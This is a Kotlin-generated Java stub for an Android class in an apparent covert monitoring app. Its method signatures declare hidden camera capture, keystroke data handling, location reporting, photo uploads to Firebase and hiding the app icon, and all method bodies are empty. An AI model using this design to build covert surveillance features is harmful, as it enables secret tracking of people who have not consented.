package com.safe.setting.app.services.accessibilityData;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000p\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\t\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\u000b\n\u0002\b\t\n\u0002\u0010\b\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0002\b\u0007\n\u0002\u0018\u0002\n\u0002\b\u0003\u0018\u00002\u00020\u00012\u00020\u0002B\u0017\b\u0007\u0012\u0006\u0010\u0003\u001a\u00020\u0004\u0012\u0006\u0010\u0005\u001a\u00020\u0006\u00a2\u0006\u0002\u0010\u0007J\b\u0010\u0013\u001a\u00020\u0014H\u0016J\u0018\u0010\u0015\u001a\u00020\u00142\u0006\u0010\u0016\u001a\u00020\u00172\u0006\u0010\u0018\u001a\u00020\u0017H\u0002J\u0010\u0010\u0019\u001a\u00020\u00142\u0006\u0010\u001a\u001a\u00020\u001bH\u0016J\u0010\u0010\u001c\u001a\u00020\u00142\u0006\u0010\u001d\u001a\u00020\u001bH\u0016J\b\u0010\u001e\u001a\u00020\u0014H\u0016J\b\u0010\u001f\u001a\u00020\u0017H\u0002J\b\u0010 \u001a\u00020\u0017H\u0002J\b\u0010!\u001a\u00020\u0014H\u0016J\u0018\u0010\"\u001a\u00020\u00142\u0006\u0010\u0016\u001a\u00020\u00172\u0006\u0010\u0018\u001a\u00020\u0017H\u0002J\u0010\u0010#\u001a\u00020\u00142\u0006\u0010$\u001a\u00020%H\u0016J\u0010\u0010&\u001a\u00020\u00142\u0006\u0010\'\u001a\u00020(H\u0016J\u0012\u0010)\u001a\u00020\u00142\b\u0010\'\u001a\u0004\u0018\u00010\u0017H\u0002J\u0010\u0010*\u001a\u00020\u00142\u0006\u0010+\u001a\u00020\u0017H\u0016J\u0010\u0010,\u001a\u00020\u00142\u0006\u0010\u001d\u001a\u00020-H\u0016J\u0018\u0010.\u001a\u00020\u00142\u0006\u0010/\u001a\u00020\u00172\u0006\u00100\u001a\u00020\u0017H\u0002J\u0010\u00101\u001a\u00020\u00142\u0006\u00102\u001a\u00020\u001bH\u0016J\u0010\u00103\u001a\u00020\u00142\u0006\u00104\u001a\u000205H\u0002J\b\u00106\u001a\u00020\u0014H\u0016J\b\u00107\u001a\u00020\u0014H\u0016R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\tX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u000bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\f\u001a\u00020\rX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000e\u001a\u00020\rX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\rX\u0082D\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0010\u001a\u00020\u0011X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0012\u001a\u00020\rX\u0082\u000e\u00a2\u0006\u0002\n\u0000\u00a8\u00068"}, d2 = {"Lcom/safe/setting/app/services/accessibilityData/InteractorAccessibilityData;", "Lcom/safe/setting/app/services/accessibilityData/InterfaceAccessibility;", "Lcom/safe/setting/app/utils/hiddenCameraServiceUtils/CameraCallbacks;", "context", "Landroid/content/Context;", "firebase", "Lcom/safe/setting/app/data/rxFirebase/InterfaceFirebase;", "(Landroid/content/Context;Lcom/safe/setting/app/data/rxFirebase/InterfaceFirebase;)V", "countDownTimer", "Lcom/safe/setting/app/utils/MyCountDownTimer;", "disposable", "Lio/reactivex/rxjava3/disposables/CompositeDisposable;", "interval", "", "lastLocationUpdate", "locationUpdateInterval", "pictureCapture", "Lcom/safe/setting/app/utils/hiddenCameraServiceUtils/HiddenCameraService;", "startTime", "clearDisposable", "", "e", "tag", "", "message", "enableGps", "gps", "", "enablePermissionLocation", "location", "getCapturePicture", "getDateTime", "getRandomNumeric", "getShowOrHideApp", "i", "onCameraError", "errorCode", "", "onImageCapture", "imageFile", "Ljava/io/File;", "sendFilePhoto", "setDataKey", "data", "setDataLocation", "Landroid/location/Location;", "setPushNamePhoto", "url", "namePhoto", "setRunServiceData", "run", "startCameraPicture", "childPhoto", "Lcom/safe/setting/app/data/model/ChildPhoto;", "startCountDownTimer", "stopCountDownTimer", "app_release"})
public final class InteractorAccessibilityData implements com.safe.setting.app.services.accessibilityData.InterfaceAccessibility, com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraCallbacks {
    @org.jetbrains.annotations.NotNull()
    private final android.content.Context context = null;
    @org.jetbrains.annotations.NotNull()
    private final com.safe.setting.app.data.rxFirebase.InterfaceFirebase firebase = null;
    private long startTime = 86400000L;
    private long interval = 1000L;
    @org.jetbrains.annotations.NotNull()
    private com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService pictureCapture;
    @org.jetbrains.annotations.NotNull()
    private io.reactivex.rxjava3.disposables.CompositeDisposable disposable;
    private long lastLocationUpdate = 0L;
    private final long locationUpdateInterval = 60000L;
    @org.jetbrains.annotations.NotNull()
    private com.safe.setting.app.utils.MyCountDownTimer countDownTimer;
    
    @javax.inject.Inject()
    public InteractorAccessibilityData(@org.jetbrains.annotations.NotNull()
    android.content.Context context, @org.jetbrains.annotations.NotNull()
    com.safe.setting.app.data.rxFirebase.InterfaceFirebase firebase) {
        super();
    }
    
    @java.lang.Override()
    public void startCountDownTimer() {
    }
    
    @java.lang.Override()
    public void stopCountDownTimer() {
    }
    
    @java.lang.Override()
    public void clearDisposable() {
    }
    
    @java.lang.Override()
    public void setDataKey(@org.jetbrains.annotations.NotNull()
    java.lang.String data) {
    }
    
    @java.lang.Override()
    public void setDataLocation(@org.jetbrains.annotations.NotNull()
    android.location.Location location) {
    }
    
    @java.lang.Override()
    public void enablePermissionLocation(boolean location) {
    }
    
    @java.lang.Override()
    public void enableGps(boolean gps) {
    }
    
    @java.lang.Override()
    public void setRunServiceData(boolean run) {
    }
    
    @java.lang.Override()
    public void getShowOrHideApp() {
    }
    
    @java.lang.Override()
    public void getCapturePicture() {
    }
    
    private final void startCameraPicture(com.safe.setting.app.data.model.ChildPhoto childPhoto) {
    }
    
    @java.lang.Override()
    public void onImageCapture(@org.jetbrains.annotations.NotNull()
    java.io.File imageFile) {
    }
    
    @java.lang.Override()
    public void onCameraError(int errorCode) {
    }
    
    private final void sendFilePhoto(java.lang.String imageFile) {
    }
    
    private final void setPushNamePhoto(java.lang.String url, java.lang.String namePhoto) {
    }
    
    private final java.lang.String getDateTime() {
        return null;
    }
    
    private final java.lang.String getRandomNumeric() {
        return null;
    }
    
    private final void e(@kotlin.Suppress(names = {"SameParameterValue"})
    java.lang.String tag, java.lang.String message) {
    }
    
    private final void i(java.lang.String tag, java.lang.String message) {
    }
}